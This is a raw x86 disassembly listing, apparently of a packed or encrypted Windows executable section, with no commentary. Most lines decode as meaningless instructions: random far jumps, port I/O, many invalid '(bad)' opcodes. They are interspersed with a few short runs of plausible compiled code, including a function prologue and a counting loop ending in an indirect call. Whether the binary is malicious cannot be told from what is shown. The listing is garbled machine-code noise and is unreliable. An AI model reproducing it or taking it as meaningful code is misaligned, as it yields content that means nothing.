  40b785:	fsub   DWORD PTR [eax+0x6bfc464d]
  40b78b:	imul   esp,ebx,0x73
  40b78e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b78f:	jnp    0x40b717
  40b791:	cs pop ebp
  40b793:	pusha  
  40b794:	cld    
  40b795:	shl    ah,0x1d
  40b798:	xchg   esi,eax
  40b799:	mov    ebx,DWORD PTR gs:[ebx+0x34]
  40b79d:	cdq    
  40b79e:	lods   al,BYTE PTR ds:[esi]
  40b79f:	repz dec esi
  40b7a1:	fist   WORD PTR [ebx]
  40b7a3:	xchg   ebx,eax
  40b7a4:	mov    dh,0xa3
  40b7a6:	jge    0x40b80e
  40b7a8:	mov    edi,0xa24f49fa
  40b7ad:	bound  ebx,QWORD PTR [ecx-0x872ae41]
  40b7b3:	leave  
  40b7b4:	repnz sbb eax,0x511886b0
  40b7ba:	out    dx,eax
  40b7bb:	push   0x3d
  40b7bd:	(bad)  
  40b7be:	or     ebx,ebp
  40b7c0:	jge    0x40b7fa
  40b7c2:	pop    ebp
  40b7c3:	mov    ebp,0x15c60ee3
  40b7c8:	inc    esp
  40b7c9:	inc    edx
  40b7ca:	jmp    0xefd389d0
  40b7cf:	xchg   edx,eax
  40b7d0:	div    BYTE PTR [ebp-0x344e4a2]
  40b7d6:	imul   esp,edi,0xd76c003d
  40b7dc:	in     al,dx
  40b7dd:	loope  0x40b7df
  40b7df:	loop   0x40b7f1
  40b7e1:	xor    esi,DWORD PTR fs:[ebx-0x36ece4f6]
  40b7e8:	xchg   DWORD PTR [ebx+esi*4+0xdafa6d7],edx
  40b7ef:	dec    edi
  40b7f0:	xor    ecx,DWORD PTR [esi]
  40b7f2:	bound  eax,QWORD PTR [edx-0x3c]
  40b7f5:	add    esi,DWORD PTR [edx-0x14]
  40b7f8:	xchg   edi,eax
  40b7f9:	xlat   BYTE PTR ds:[ebx]
  40b7fa:	scas   al,BYTE PTR es:[edi]
  40b7fb:	jbe    0x40b81d
  40b7fd:	sbb    al,BYTE PTR [ecx+0x9]
  40b800:	jmp    0xf307:0x3fbf5221
  40b807:	mov    ebp,0x6bf59da3
  40b80c:	push   0x6d
  40b80e:	jmp    0xa392e1f6
  40b813:	inc    ebx
  40b814:	fcom   QWORD PTR [edi]
  40b816:	jp     0x40b81b
  40b818:	aaa    
  40b819:	outs   dx,DWORD PTR ds:[esi]
  40b81a:	fild   WORD PTR [eax+0x23]
  40b81d:	(bad)  
  40b81e:	sbb    al,0x2b
  40b820:	into   
  40b821:	add    DWORD PTR [ecx+ebx*4+0x5b5f374],ecx
  40b828:	xor    al,0x6f
  40b82a:	and    edi,DWORD PTR [esi]
  40b82c:	lock mov esp,0xf86d8d6b
  40b832:	sahf   
  40b833:	hlt    
  40b834:	mov    esi,0x11e9fad8
  40b839:	loop   0x40b850
  40b83b:	push   ds
  40b83c:	xchg   BYTE PTR gs:[edi],dh
  40b83f:	and    bh,cl
  40b841:	mov    al,BYTE PTR [eax+ecx*1]
  40b844:	add    al,0x37
  40b846:	jmp    0x40b9fe
  40b84b:	hlt    
  40b84c:	sbb    eax,0x71518348
  40b851:	rep ins DWORD PTR es:[edi],dx
  40b853:	cmp    BYTE PTR [esp+ecx*2],al
  40b856:	aaa    
  40b857:	ja     0x40b84f
  40b859:	sbb    bl,BYTE PTR [ebx]
  40b85b:	dec    edi
  40b85c:	bnd jo 0x40b8cf
  40b85f:	xchg   ebp,eax
  40b860:	jg     0x40b8d2
  40b862:	jo     0x40b8af
  40b864:	bound  esp,QWORD PTR [bx+di+0x56]
  40b868:	outs   dx,BYTE PTR ds:[esi]
  40b869:	xchg   ecx,eax
  40b86a:	dec    ecx
  40b86b:	adc    esi,DWORD PTR [ebp+0x43]
  40b86e:	cwde   
  40b86f:	adc    ah,BYTE PTR [eax]
  40b871:	sbb    DWORD PTR [esi+ebp*4],esp
  40b874:	or     esp,ecx
  40b876:	pop    esi
  40b877:	fstp   DWORD PTR [edi-0x773363fb]
  40b87d:	adc    ah,ch
  40b87f:	imul   eax,DWORD PTR [esi],0xffffffd0
  40b882:	or     BYTE PTR [esi],ch
  40b884:	adc    DWORD PTR [esi-0x5b2a2bcb],esp
  40b88a:	repnz stc 
  40b88c:	xchg   DWORD PTR ds:0x3456dad3,ecx
  40b892:	in     al,dx
  40b893:	mov    esp,0x8f49caa7
  40b898:	and    eax,0xbe93414f
  40b89d:	jp     0x40b8b7
  40b89f:	pusha  
  40b8a0:	mov    esi,0x8202ac3a
  40b8a5:	lea    edi,[ebp+0x72]
  40b8a8:	lock jnp 0x40b8ff
  40b8ab:	or     al,0x7e
  40b8ad:	and    al,0xe5
  40b8af:	out    dx,al
  40b8b0:	and    DWORD PTR [eax],0x7b90175c
  40b8b6:	xchg   esp,eax
  40b8b7:	int3   
  40b8b8:	out    dx,al
  40b8b9:	sbb    BYTE PTR [esi],bh
  40b8bb:	jae    0x40b904
  40b8bd:	out    dx,eax
  40b8be:	jb     0x40b93d
  40b8c0:	aad    0xa6
  40b8c2:	push   ds
  40b8c3:	scas   eax,DWORD PTR es:[edi]
  40b8c4:	or     eax,0xe32a55bd
  40b8c9:	jle    0x40b885
  40b8cb:	jg     0x40b856
  40b8cd:	hlt    
  40b8ce:	and    eax,0x217d1a1c
  40b8d3:	mov    ah,0xd2
  40b8d5:	rcr    DWORD PTR [ecx-0x35],0xf9
  40b8d9:	rol    DWORD PTR [esi],cl
  40b8db:	xor    DWORD PTR [ebx-0x1640b621],esp
  40b8e1:	jl     0x40b8e0
  40b8e3:	sbb    BYTE PTR [ecx-0x4b],0x20
  40b8e7:	cmp    BYTE PTR [edi],ch
  40b8e9:	cmp    BYTE PTR [edi+0x3a],cl
  40b8ec:	cld    
  40b8ed:	adc    BYTE PTR [edx],0x90
  40b8f0:	inc    esp
  40b8f1:	shr    BYTE PTR [ebx+0x19],0x43
  40b8f5:	adc    al,0xab
  40b8f7:	lds    ebx,FWORD PTR ds:0x4dc27972
  40b8fd:	in     eax,0x2a
  40b8ff:	out    0xaa,al
  40b901:	(bad)  
  40b902:	inc    edi
  40b903:	push   ebx
  40b904:	add    edx,ebx
  40b906:	sub    eax,0x984de3f5
  40b90b:	adc    BYTE PTR fs:[esp+eax*8+0x5e],bh
  40b910:	mov    cl,BYTE PTR [ebx-0x700eee67]
  40b916:	outs   dx,DWORD PTR ds:[esi]
  40b917:	jl     0x40b946
  40b919:	mov    ecx,0xc14202e0
  40b91e:	test   DWORD PTR ss:[esp+esi*1-0x4c02f0c9],0xe6664999
  40b92a:	inc    eax
  40b92b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b92c:	(bad)  
  40b92d:	xchg   ebx,eax
  40b92e:	mov    edi,0xff1f0939
  40b933:	pop    edi
  40b934:	sbb    al,0xbe
  40b936:	inc    edi
  40b937:	daa    
  40b938:	add    eax,0xc189526f
  40b93d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b93e:	pop    esp
  40b93f:	add    DWORD PTR [ecx-0x8ff6aba],0xffffffe7
  40b946:	(bad)  
  40b947:	and    esi,DWORD PTR [edi-0x46]
  40b94a:	out    dx,al
  40b94b:	mov    cl,0xc0
  40b94d:	imul   ebp,DWORD PTR [ecx],0x2507dca1
  40b953:	pop    edi
  40b954:	push   eax
  40b955:	adc    ecx,DWORD PTR [ebp+ecx*8+0x6cb90e23]
  40b95c:	out    dx,al
  40b95d:	add    al,0x56
  40b95f:	jp     0x40b9e0
  40b961:	sar    DWORD PTR [esi],cl
  40b963:	jnp    0x40b8eb
  40b965:	add    DWORD PTR [bx+di-0xdb4],0xfaf2d810
  40b96e:	adc    DWORD PTR es:[edi+eiz*2],edi
  40b972:	mov    cl,0x8c
  40b974:	mov    al,0x9b
  40b976:	pop    ds
  40b977:	loopne 0x40b939
  40b979:	mov    ecx,0xe9f2bb6c
  40b97e:	and    BYTE PTR [esp+eiz*4+0x4d7bd85b],al
  40b985:	je     0x40b9a2
  40b987:	shld   DWORD PTR [ebp+0x6996e995],esi,0xff
  40b98f:	stc    
  40b990:	push   0x2f
  40b992:	dec    esp
  40b993:	push   edx
  40b994:	jo     0x40b9b7
  40b996:	fcomp  QWORD PTR [esi+eiz*8-0x12dc9f63]
  40b99d:	inc    ecx
  40b99e:	sub    BYTE PTR [edx],ah
  40b9a0:	cwde   
  40b9a1:	nop
  40b9a2:	cli    
  40b9a3:	dec    esi
  40b9a4:	xchg   esi,eax
  40b9a5:	js     0x40ba1d
  40b9a7:	dec    eax
  40b9a8:	mov    cl,0xee
  40b9aa:	fstp   DWORD PTR [edx]
  40b9ac:	push   edi
  40b9ad:	push   edx
  40b9ae:	mov    ds:0x77a00f5a,eax
  40b9b3:	std    
  40b9b4:	fcomip st,st(5)
  40b9b6:	fs test eax,0x50938407
  40b9bc:	sub    WORD PTR [edi],si
  40b9bf:	pop    esp
  40b9c0:	pop    esi
  40b9c1:	shl    DWORD PTR [edx-0x21db78a6],1
  40b9c7:	fisubr WORD PTR [edi-0x3abfbb97]
  40b9cd:	or     BYTE PTR [ebp-0x71],0x35
  40b9d1:	int    0xb8
  40b9d3:	xor    DWORD PTR [ebp+ebp*1-0x15],esp
  40b9d7:	leave  
  40b9d8:	clc    
  40b9d9:	int3   
  40b9da:	into   
  40b9db:	in     eax,0x4a
  40b9dd:	(bad)
  40b9e0:	mov    ebp,0x2c5c1100
  40b9e5:	pop    ebp
  40b9e6:	imul   edi,ebp,0xb6a902fa
  40b9ec:	jle    0x40b9c8
  40b9ee:	js     0x40ba17
  40b9f0:	adc    al,0x2d
  40b9f2:	ins    DWORD PTR es:[edi],dx
  40b9f3:	fnstcw WORD PTR [eax-0xa900c26]
  40b9f9:	hlt    
  40b9fa:	add    al,0x89
  40b9fc:	jmp    0xfc5:0x3c473434
  40ba03:	test   BYTE PTR [ecx],dl
  40ba05:	add    BYTE PTR [eax],al
  40ba07:	add    BYTE PTR [ebx+0x4d8b0845],cl
  40ba0d:	clc    
  40ba0e:	xor    eax,esi
  40ba10:	add    eax,edi
  40ba12:	mov    DWORD PTR [ecx],eax
  40ba14:	jmp    0x40bbf5
  40ba19:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40ba20:	jmp    0x40bbf5
  40ba25:	mov    eax,DWORD PTR [ebp-0x8]
  40ba28:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ba2b:	mov    ecx,DWORD PTR [ecx]
  40ba2d:	mov    DWORD PTR [eax],ecx
  40ba2f:	mov    eax,DWORD PTR [ebp+0xc]
  40ba32:	jmp    0x40bbea
  40ba37:	retf   
  40ba38:	(bad)  [ebx+0x5171a9c1]
  40ba3e:	icebp  
  40ba3f:	dec    eax
  40ba40:	cmp    eax,0x65570d6b
  40ba45:	(bad)  
  40ba46:	mov    esi,0x7070f0e4
  40ba4b:	xchg   ebp,eax
  40ba4c:	jg     0x40babe
  40ba4e:	jo     0x40ba2d
  40ba50:	in     eax,0x49
  40ba52:	(bad)  
  40ba54:	(bad)  
  40ba55:	sti    
  40ba56:	retf   0xf533
  40ba59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba5a:	sbb    al,0x39
  40ba5c:	fdiv   st(5),st
  40ba5e:	mov    dl,0xc9
  40ba60:	xchg   esp,eax
  40ba61:	jg     0x40ba14
  40ba63:	lods   al,BYTE PTR ds:[esi]
  40ba64:	shl    BYTE PTR [edi-0x70],cl
  40ba67:	mov    edi,0x13a88365
  40ba6c:	hlt    
  40ba6d:	inc    esp
  40ba6e:	rcr    BYTE PTR [edx],cl
  40ba70:	outs   dx,DWORD PTR ds:[esi]
  40ba71:	dec    ebx
  40ba72:	or     bh,BYTE PTR [eax-0x2a9dca59]
  40ba78:	popf   
  40ba79:	shl    ebp,cl
  40ba7b:	xchg   esp,eax
  40ba7c:	(bad)  
  40ba7d:	and    BYTE PTR [ebp-0x7b],ch
  40ba80:	lahf   
  40ba81:	lods   al,BYTE PTR ds:[esi]
  40ba82:	dec    edi
  40ba83:	mov    DWORD PTR [esi+0x1e084f9e],eax
  40ba89:	jg     0x40ba7f
  40ba8b:	jle    0x40bad5
  40ba8d:	mov    eax,ds:0x5b610711
  40ba92:	push   0x18
  40ba94:	pop    edi
  40ba95:	cli    
  40ba96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba97:	jae    0x40ba64
  40ba99:	in     al,0xc7
  40ba9b:	dec    edi
  40ba9c:	into   
  40ba9d:	jnp    0x40ba70
  40ba9f:	aas    
  40baa0:	inc    edi
  40baa1:	pop    edx
  40baa2:	ficom  WORD PTR [edx+0xb]
  40baa5:	shl    DWORD PTR [ecx+ebx*2-0x4c],0xf5
  40baaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baab:	dec    ebp
  40baac:	mov    esp,0x4915ab9
  40bab1:	adc    al,0xea
  40bab3:	adc    BYTE PTR ds:0x45305880,bh
  40bab9:	pushf  
  40baba:	jg     0x40bb04
  40babc:	inc    edi
  40babd:	and    BYTE PTR [ebx],al
  40babf:	inc    BYTE PTR [ebx-0x53]
  40bac2:	(bad)  
  40bac3:	iret   
  40bac4:	retf   0xf9bb
  40bac7:	fcom   QWORD PTR [edi+0x32efec6c]
  40bacd:	and    al,0xe5
  40bacf:	jb     0x40bad0
  40bad1:	dec    ebp
  40bad2:	scas   al,BYTE PTR es:[edi]
  40bad3:	xor    al,bl
  40bad5:	in     eax,dx
  40bad6:	test   al,0x12
  40bad8:	in     al,dx
  40bad9:	or     edx,DWORD PTR [eax-0x1419bbb8]
  40badf:	sar    DWORD PTR [ebp+ebx*2-0x409eac7],1
  40bae6:	stos   BYTE PTR es:[edi],al
  40bae7:	or     al,0x3f
  40bae9:	mov    ecx,0x7b8788f3
  40baee:	aas    
  40baef:	in     eax,dx
  40baf0:	ins    BYTE PTR es:[edi],dx
  40baf1:	adc    bh,ch
  40baf3:	mov    ebp,0x3ffd3044
  40baf8:	pop    esp
  40baf9:	xor    ah,BYTE PTR [edx]
  40bafb:	jecxz  0x40badd
  40bafd:	jg     0x40bb59
  40baff:	xor    al,0x89
  40bb01:	std    
  40bb02:	add    DWORD PTR [eax-0x19],0xffffff8b
  40bb06:	xchg   esp,eax
  40bb07:	or     bl,BYTE PTR [ecx-0x75]
  40bb0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb0b:	idiv   dl
  40bb0d:	out    0xca,eax
  40bb0f:	xchg   ecx,eax
  40bb10:	test   DWORD PTR [ebp+0x4ef43a04],0x635b0cb1
  40bb1a:	shl    BYTE PTR ss:[eax],cl
  40bb1d:	xchg   ebp,eax
  40bb1e:	mov    ds:0x92d4c9bf,al
  40bb23:	jle    0x40bb4c
  40bb25:	sti    
  40bb26:	std    
  40bb27:	icebp  
  40bb28:	retf   
  40bb29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb2a:	push   edi
  40bb2b:	pop    ecx
  40bb2c:	stc    
  40bb2d:	and    bl,BYTE PTR [esi]
  40bb2f:	stos   BYTE PTR es:[edi],al
  40bb30:	mov    ebp,0xc4d2fd6e
  40bb35:	arpl   bp,di
  40bb37:	add    edx,esi
  40bb39:	mov    eax,ds:0x4806920f
  40bb3e:	xor    ah,ah
  40bb40:	push   cs
  40bb41:	xchg   ebx,eax
  40bb42:	scas   eax,DWORD PTR es:[edi]
  40bb43:	arpl   bp,bx
  40bb45:	cmc    
  40bb46:	ror    DWORD PTR [esi],cl
  40bb48:	dec    ebx
  40bb49:	pushf  
  40bb4a:	ds dec ebx
  40bb4c:	ret    0x84b
  40bb4f:	jmp    0xe1dcfeea
  40bb54:	ret    0xe3cb
  40bb57:	std    
  40bb58:	in     al,dx
  40bb59:	sbb    DWORD PTR [ebx],esp
  40bb5b:	cmovno edi,DWORD PTR [ebx]
  40bb5e:	call   0x6b380cea
  40bb63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb64:	in     al,0xd2
  40bb66:	int    0x55
  40bb68:	xchg   BYTE PTR [ebx-0x7505b960],bh
  40bb6e:	loop   0x40bb52
  40bb70:	adc    edi,ebp
  40bb72:	in     eax,0xee
  40bb74:	add    esi,DWORD PTR [edx+0x36]
  40bb77:	pushf  
  40bb78:	loope  0x40bbdb
  40bb7a:	fsubr  st,st(6)
  40bb7c:	sub    dh,BYTE PTR [esi]
  40bb7e:	and    eax,0x866cf666
  40bb83:	fucomip st,st(0)
  40bb85:	shl    DWORD PTR [ecx],0xf5
  40bb88:	(bad)  
  40bb89:	sti    
  40bb8a:	imul   ecx,DWORD PTR [edx+0x603d847],0xffffffa9
  40bb91:	in     eax,0xed
  40bb93:	stc    
  40bb94:	std    
  40bb95:	ficomp DWORD PTR [ecx]
  40bb97:	loopne 0x40bbd8
  40bb99:	fld    DWORD PTR [ebp-0x175cb778]
  40bb9f:	dec    esi
  40bba0:	sub    DWORD PTR [ecx],ebp
  40bba2:	popa   
  40bba3:	sub    cl,BYTE PTR [esi]
  40bba5:	aas    
  40bba6:	xlat   BYTE PTR ds:[ebx]
  40bba7:	cdq    
  40bba8:	ret    
  40bba9:	mov    dl,0x52
  40bbab:	int3   
  40bbac:	sar    ah,cl
  40bbae:	cdq    
  40bbaf:	pop    esi
  40bbb0:	aad    0x7a
  40bbb2:	repnz gs xor eax,0xbceb5bbc
  40bbb9:	in     al,dx
  40bbba:	or     ah,ch
  40bbbc:	mov    al,0xb0
  40bbbe:	pop    esp
  40bbbf:	sbb    ch,al
  40bbc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbc2:	aad    0x7d
  40bbc4:	add    ah,dh
  40bbc6:	(bad)  [eax]
  40bbc8:	inc    ecx
  40bbc9:	neg    DWORD PTR [ebx]
  40bbcb:	aas    
  40bbcc:	mov    WORD PTR [edi-0x511b27c],?
  40bbd2:	es stos DWORD PTR es:[edi],eax
  40bbd4:	dec    esi
  40bbd5:	jmp    0xd65b:0x5250ebd1
  40bbdc:	hlt    
  40bbdd:	pop    edi
  40bbde:	mov    BYTE PTR [ecx],dl
  40bbe0:	dec    ebx
  40bbe1:	sbb    esi,DWORD PTR [edx+ebp*2+0x1cdea1d]
  40bbe8:	xchg   esp,eax
  40bbe9:	mov    ah,0x8b
  40bbeb:	inc    ebp
  40bbec:	or     bh,bh
  40bbee:	jne    0x40bbe8
  40bbf0:	call   0x401000
  40bbf5:	mov    eax,DWORD PTR [ebp-0xc]
  40bbf8:	cmp    eax,ebx
  40bbfa:	je     0x40acdc
  40bc00:	mov    eax,DWORD PTR [ebp-0x8]
  40bc03:	mov    eax,DWORD PTR [eax]
  40bc05:	pop    edi
  40bc06:	pop    esi
  40bc07:	pop    ebx
  40bc08:	leave  
  40bc09:	ret    0x8
  40bc0c:	push   ebp
  40bc0d:	mov    ebp,esp
  40bc0f:	push   ecx
  40bc10:	sbb    DWORD PTR ds:0x43429a,ecx
  40bc16:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40bc1d:	sbb    eax,DWORD PTR ds:0x434292
  40bc23:	mov    eax,DWORD PTR [ebp+0x8]
  40bc26:	or     DWORD PTR ds:0x434315,0x432cbe
  40bc30:	jmp    0x40be4b
  40bc35:	push   es
  40bc36:	mov    ch,dl
  40bc38:	xor    al,0x72
  40bc3a:	je     0x40bc02
  40bc3c:	stos   BYTE PTR es:[edi],al
  40bc3d:	aas    
  40bc3e:	lods   al,BYTE PTR ds:[esi]
  40bc3f:	and    DWORD PTR [eax-0x65fe45f7],edi
  40bc45:	jns    0x40bc45
  40bc47:	jo     0x40bcb9
  40bc49:	jb     0x40bcca
  40bc4b:	jo     0x40bcbd
  40bc4d:	xor    al,0x70
  40bc4f:	jmp    0xdd9a:0x3bc90fbc
  40bc56:	(bad)  
  40bc57:	push   0x1b
  40bc59:	xchg   ecx,eax
  40bc5a:	pusha  
  40bc5b:	ja     0x40bc38
  40bc5d:	ja     0x40bcde
  40bc5f:	ret    0xea4b
  40bc62:	mov    fs,WORD PTR [edx+0x6728a50e]
  40bc68:	jmp    0x9acf:0x35b80051
  40bc6f:	les    esp,FWORD PTR [edi+0x5]
  40bc72:	fwait
  40bc73:	cmp    eax,0xf02249dd
  40bc78:	cdq    
  40bc79:	out    dx,al
  40bc7a:	dec    esp
  40bc7b:	leave  
  40bc7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc7d:	jmp    0x40bc98
  40bc7f:	jge    0x40bcd2
  40bc81:	xor    edi,DWORD PTR [ecx+0x67e90627]
  40bc87:	sub    eax,0x721bdf25
  40bc8c:	stos   BYTE PTR es:[edi],al
  40bc8d:	sub    al,bl
  40bc8f:	mov    eax,0x49d33d4a
  40bc94:	xchg   DWORD PTR [eax+0x13],ecx
  40bc97:	daa    
  40bc98:	sbb    bh,BYTE PTR [ecx-0x19]
  40bc9b:	mov    bh,0x3c
  40bc9d:	repnz dec esp
  40bc9f:	jecxz  0x40bcfe
  40bca1:	push   cs
  40bca2:	mov    eax,ds:0x301bad08
  40bca7:	mov    ebx,0xf56cfb11
  40bcac:	cli    
  40bcad:	jmp    0x40bc8f
  40bcaf:	sub    BYTE PTR [ebp+0x69],bh
  40bcb2:	push   edi
  40bcb3:	int    0xbf
  40bcb5:	(bad)  
  40bcb6:	out    dx,al
  40bcb7:	jg     0x40bca1
  40bcb9:	and    ebx,DWORD PTR [esi-0x6aac7dc8]
  40bcbf:	pop    eax
  40bcc0:	ss (bad) 
  40bcc3:	es push ebx
  40bcc5:	pop    ebp
  40bcc6:	mov    edx,0xff1ddd93
  40bccb:	jno    0x40bd37
  40bccd:	stos   BYTE PTR es:[edi],al
  40bcce:	mov    BYTE PTR [esi+0x22],dh
  40bcd1:	fadd   DWORD PTR [esi-0x10]
  40bcd4:	xchg   edx,eax
  40bcd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcd6:	sbb    ebp,DWORD PTR [edi+0x36]
  40bcd9:	dec    edi
  40bcda:	std    
  40bcdb:	(bad)  
  40bcdd:	xchg   BYTE PTR [edi],bh
  40bcdf:	jp     0x40bc80
  40bce1:	jbe    0x40bcfc
  40bce3:	fwait
  40bce4:	mov    ebp,0x1a6b09d4
  40bce9:	add    al,0x9c
  40bceb:	les    esp,FWORD PTR [eax]
  40bced:	nop
  40bcee:	arpl   WORD PTR [edi-0x51a94a0e],ax
  40bcf4:	mov    DWORD PTR [ebp+0x5d],0xb4fd32d0
  40bcfb:	cwde   
  40bcfc:	(bad)  
  40bcfd:	aaa    
  40bcfe:	jp     0x40bd39
  40bd00:	test   BYTE PTR [esi+ebx*8-0x149a41],dh
  40bd07:	mov    ebp,0xe885f203
  40bd0c:	pop    ss
  40bd0d:	jl     0x40bd16
  40bd0f:	fisttp QWORD PTR [esi]
  40bd11:	and    BYTE PTR [esi],al
  40bd13:	(bad)  
  40bd15:	pop    esi
  40bd16:	mov    bl,0xc6
  40bd18:	arpl   WORD PTR [eax-0x72],bp
  40bd1b:	adc    al,0x29
  40bd1d:	ret    
  40bd1e:	xchg   al,cl
  40bd20:	add    dh,BYTE PTR [edi-0x79879534]
  40bd26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd27:	sub    al,0x1d
  40bd29:	jmp    0x40bd94
  40bd2b:	mov    ah,0x73
  40bd2d:	out    0xd1,eax
  40bd2f:	add    edx,edx
  40bd31:	aam    0xef
  40bd33:	cmp    al,0x84
  40bd35:	add    eax,0x32e683a8
  40bd3a:	sub    bh,dl
  40bd3c:	xchg   edi,eax
  40bd3d:	jmp    DWORD PTR ds:0x15de884
  40bd43:	xchg   ebx,eax
  40bd44:	jns    0x40bdaa
  40bd46:	stos   BYTE PTR es:[edi],al
  40bd47:	sbb    al,0x29
  40bd49:	or     al,ah
  40bd4b:	mov    edi,gs
  40bd4d:	(bad)  
  40bd4e:	cs arpl sp,dx
  40bd51:	and    BYTE PTR [ebx],ch
  40bd53:	fst    DWORD PTR [edx]
  40bd55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd56:	inc    esi
  40bd57:	push   eax
  40bd58:	jae    0x40bd7c
  40bd5a:	retf   0x980d
  40bd5d:	dec    edx
  40bd5e:	repz clc 
  40bd60:	cmc    
  40bd61:	add    al,0x9b
  40bd63:	loop   0x40bd9d
  40bd65:	or     ebp,DWORD PTR [ecx+0x3d1f4cbf]
  40bd6b:	add    eax,0x6f3f74fe
  40bd70:	stos   DWORD PTR es:[edi],eax
  40bd71:	sbb    BYTE PTR [esi+ebp*1+0x3c39a84e],dh
  40bd78:	add    al,0x0
  40bd7a:	daa    
  40bd7b:	dec    edi
  40bd7c:	add    cl,BYTE PTR [eax]
  40bd7e:	xchg   ecx,eax
  40bd7f:	pinsrw mm5,WORD PTR [edi+0x2c22dc57],0xb3
  40bd87:	push   0x24ae1b26
  40bd8c:	cmp    cl,bl
  40bd8e:	xor    al,0xa7
  40bd90:	mov    ds:0xc81bcb58,al
  40bd95:	in     eax,dx
  40bd96:	fst    st(5)
  40bd98:	mov    ebp,0xdc19d6b0
  40bd9d:	sub    edx,DWORD PTR [ecx+edi*8+0x6b]
  40bda1:	ins    DWORD PTR es:[edi],dx
  40bda2:	sbb    dh,cl
  40bda4:	neg    DWORD PTR [ecx]
  40bda6:	outs   dx,BYTE PTR ds:[esi]
  40bda7:	test   DWORD PTR [ebx-0x51],edi
  40bdaa:	stos   DWORD PTR es:[edi],eax
  40bdab:	mov    eax,0x3053b84f
  40bdb0:	sub    DWORD PTR [esp+eax*8],edx
  40bdb3:	sub    DWORD PTR [eax],eax
  40bdb5:	pop    ecx
  40bdb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdb7:	fwait
  40bdb8:	in     eax,0xed
  40bdba:	aaa    
  40bdbb:	repnz inc ecx
  40bdbd:	pop    edx
  40bdbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdbf:	xchg   dh,ch
  40bdc1:	fdivrp st(3),st
  40bdc3:	into   
  40bdc4:	add    al,0x72
  40bdc6:	push   ds
  40bdc7:	les    eax,FWORD PTR [edi-0x6d885b05]
  40bdcd:	jecxz  0x40be4b
  40bdcf:	jle    0x40bd95
  40bdd1:	sub    DWORD PTR [edx-0x21],edx
  40bdd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdd5:	rol    dl,0x46
  40bdd8:	and    BYTE PTR [ebx-0x2c31943e],dl
  40bdde:	push   esp
  40bddf:	test   BYTE PTR [edi-0x8],ah
  40bde2:	dec    ebx
  40bde3:	aas    
  40bde4:	ret    
  40bde5:	mov    WORD PTR [edi-0x1b],?
  40bde8:	fisub  WORD PTR [ebp-0x24644ec0]
  40bdee:	test   BYTE PTR [ebx+edx*2+0x72c2c39b],bl
  40bdf5:	add    eax,edi
  40bdf7:	mov    cl,0xc7
  40bdf9:	ins    DWORD PTR es:[edi],dx
  40bdfa:	jo     0x40bda6
  40bdfc:	aam    0x48
  40bdfe:	cmp    bh,bh
  40be00:	aam    0x15
  40be02:	jb     0x40be5e
  40be04:	loopne 0x40bd87
  40be06:	iret   
  40be07:	add    eax,ecx
  40be09:	popa   
  40be0a:	and    eax,0x4a3caeb3
  40be0f:	dec    esp
  40be10:	in     eax,dx
  40be11:	dec    esp
  40be12:	mov    edx,0x67cb2dbd
  40be17:	xchg   BYTE PTR [ebp+0x39],al
  40be1a:	or     esi,ebp
  40be1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be1d:	jns    0x40bdab
  40be1f:	and    eax,0xa2971553
  40be24:	test   al,0xfb
  40be26:	push   eax
  40be27:	xor    BYTE PTR [bp+si],al
  40be2a:	cli    
  40be2b:	sbb    eax,0xa3160a16
  40be30:	inc    eax
  40be31:	out    dx,al
  40be32:	loop   0x40be3b
  40be34:	lea    eax,[eax]
  40be36:	fisttp DWORD PTR [ecx]
  40be38:	(bad)  
  40be39:	pushf  
  40be3a:	push   ds
  40be3b:	sbb    eax,0x929becb
  40be40:	shl    DWORD PTR [ebp+0x47],cl
  40be43:	sub    DWORD PTR [ebp+0x6ef4a123],0x8a1966
  40be4d:	add    al,0x37
  40be4f:	and    DWORD PTR ds:0x432cde,0x432600
  40be59:	xor    al,0x47
  40be5b:	cmp    al,0xc3
  40be5d:	mov    DWORD PTR ds:0x432cd6,0x1383
  40be67:	jne    0x40c344
  40be6d:	mov    eax,DWORD PTR [ebp+0x8]
  40be70:	mov    ecx,DWORD PTR [ebp+0x8]
  40be73:	movzx  edx,BYTE PTR ds:0x434321
  40be7a:	xor    edx,DWORD PTR ds:0x434319
  40be80:	mov    DWORD PTR ds:0x434321,edx
  40be86:	add    ecx,DWORD PTR [eax+0x3c]
  40be89:	xor    eax,edx
  40be8b:	mov    edx,0x7510855
  40be90:	mov    DWORD PTR [ebp+0x8],ecx
  40be93:	or     ecx,0x72e5
  40be99:	mov    eax,DWORD PTR [ebp-0x4]
  40be9c:	and    DWORD PTR ds:0x434321,0x0
  40bea6:	mov    ecx,DWORD PTR ds:0x434321
  40beac:	inc    ecx
  40bead:	mov    DWORD PTR ds:0x434321,ecx
  40beb3:	cmp    DWORD PTR ds:0x434321,0x25
  40beba:	jne    0x40bed6
  40bec0:	push   0x432749
  40bec5:	push   DWORD PTR [ebp-0x24]
  40bec8:	push   0x7ea1
  40becd:	push   DWORD PTR [ebp-0x24]
  40bed0:	call   DWORD PTR ds:0x432c1a
  40bed6:	cmp    DWORD PTR ds:0x434321,0x17
  40bedd:	jb     0x40bea6
  40bee3:	xor    eax,edx
  40bee5:	push   esi
  40bee6:	jmp    0x40c101
  40beeb:	je     0x40befe
  40beed:	test   DWORD PTR [ebp+eiz*2+0x4df17194],eax
  40bef4:	pop    eax
  40bef5:	pop    esp
